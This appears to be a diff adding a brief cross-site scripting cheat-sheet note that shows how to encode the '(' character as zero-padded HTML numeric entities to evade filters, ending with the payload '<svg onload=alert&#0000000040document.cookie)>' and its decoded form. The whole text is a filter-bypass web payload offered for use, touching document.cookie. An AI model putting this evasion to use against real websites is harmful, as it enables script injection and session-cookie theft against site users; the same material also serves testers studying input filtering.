@@ -1,0 +1,15 @@
+charatcher:
+(
+is equal to:
+
+&#40
+&#040
+&#00000040
+&#0000000040
+
+(if its not working, add ; at the end)
+
+in result- 
+<svg onload=alert&#0000000040document.cookie)>
+is equal to-
+<svg onload=alert(document.cookie)>
